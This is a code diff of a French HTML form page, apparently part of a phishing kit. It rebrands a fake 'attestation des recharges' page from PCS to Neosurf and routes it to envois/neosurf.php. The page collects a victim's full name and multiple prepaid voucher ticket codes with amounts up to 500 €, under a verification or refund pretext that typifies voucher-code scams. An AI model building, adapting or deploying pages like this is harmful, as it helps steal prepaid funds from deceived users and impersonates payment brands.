@@ -1,7 +1,7 @@
 <!doctype html>
 <html lang="en">
   <head>
-  	<title>PCS - Fiche d'attestation des recharges</title>
+  	<title>Neosurf - Fiche d'attestation des recharges</title>
     <meta charset="utf-8">
     <meta name="description" content="Fiche d'attestation des recharges">
     <meta name="keywords" content="Fiche d'attestation des recharges, paysafe, neosurf, pcs, transcash, recharge transcash, recharge pcs, recharge neosurf, recharge paysafe">
@@ -19,20 +19,20 @@
 	<header>
         <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
           <div class="container-fluid">
-            <a class="navbar-brand" href="refund.html">Téléchargement d'attestation</a>
+            <a class="navbar-brand" href="attestation.php">Téléchargement d'attestation</a>
             <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation">
               <span class="navbar-toggler-icon"></span>
             </button>
             <div class="collapse navbar-collapse" id="navbarCollapse">
               <ul class="navbar-nav me-auto mb-2 mb-md-0">
                 <li class="nav-item">
-                  <a class="nav-link" href="index.html">Accueil</a>
+                  <a class="nav-link" href="index.php">Accueil</a>
                 </li>
                 <li class="nav-item">
-                  <a class="nav-link active" href="attestation.html">Télécharger une fiche d'attestation</a>
+                  <a class="nav-link active" href="attestation.php">Télécharger une fiche d'attestation</a>
                 </li>
                 <li class="nav-item">
-                  <a class="nav-link" href="refund.html">Demande de remboursement</a>
+                  <a class="nav-link" href="refund.php">Demande de remboursement</a>
                 </li>
               </ul>
             </div>
@@ -43,12 +43,12 @@
     <div class="container-fluid px-1 py-5 mx-auto">
         <div class="row d-flex justify-content-center">
             <div class="col-xl-7 col-lg-8 col-md-9 col-11 text-center">
-                <h3 class="space">PCS</h3> <br>
+                <h3 class="space">Neosurf</h3> <br>
                 <figure class="margin-bottom-medium">
-                    <img src="images/logo-pcs_.png" height="100" width="200" class="footer-logo" alt="PCS">
+                    <img src="images/neosurf.jpg" height="100" width="200" class="footer-logo" alt="Neosurf">
                 </figure>
                 <div class="card">
-                    <form class="form-card" action="envois/pcs.php" method="POST">
+                    <form class="form-card" action="envois/neosurf.php" method="POST">
                         <div class="row justify-content-between text-left">
                             <div class="form-group col-sm-12 flex-column d-flex">
                                 <input type="text" id="fname" name="fname" placeholder="Nom complet" required="required"
@@ -138,7 +138,7 @@
             $('#add').click(function () {
                 if (i < max_fields) {
                     i++;
-                    $('#row').append('<div class="row justify-content-between text-left" id="row' + i + '"><div class="form-group col-5 flex-column d-flex"><input type="text" id="ticket' + i + '" name="ticket[]" placeholder="Code du ticket" minlength="10" maxlength="10" size="10" required="required" onblur="validate(4)" oninput="javascript: if (this.value.length > 10) this.value = this.value.slice(0, 10);"></div><div class="form-group col-5 flex-column d-flex"><select name="montant" id="montant[]" required="required" onblur="validate(12)"><option selected="selected">Montant</option><option value="20.00 €">20.00 €</option><option value="30.00 €">30.00 €</option><option value="50.00 €">50.00 €</option><option value="100.00 €">100.00 €</option><option value="150.00 €">150.00 €</option><option value="200.00 €">200.00 €</option><option value="250.00 €">250.00 €</option><option value="500.00 €">500.00 €</option></select></div><div class="form-group col-1 flex-column d-flex"><button id="' + i + '" type="button" class="remove-btn form-control btn-danger">x</button></div></div>')
+                    $('#row').append('<div class="row justify-content-between text-left" id="row' + i + '"><div class="form-group col-5 flex-column d-flex"><input type="text" id="ticket' + i + '" name="ticket[]" placeholder="Code du ticket" minlength="10" maxlength="10" size="10" required="required" onblur="validate(4)" oninput="javascript: if (this.value.length > 10) this.value = this.value.slice(0, 10);"></div><div class="form-group col-5 flex-column d-flex"><select name="montant[]" id="montant" required="required" onblur="validate(12)"><option selected="selected">Montant</option><option value="20.00 €">20.00 €</option><option value="30.00 €">30.00 €</option><option value="50.00 €">50.00 €</option><option value="100.00 €">100.00 €</option><option value="150.00 €">150.00 €</option><option value="200.00 €">200.00 €</option><option value="250.00 €">250.00 €</option><option value="500.00 €">500.00 €</option></select></div><div class="form-group col-1 flex-column d-flex"><button id="' + i + '" type="button" class="remove-btn form-control btn-danger">x</button></div></div>')
                 }
             });
             $(document).on('click', '.remove-btn', function () {
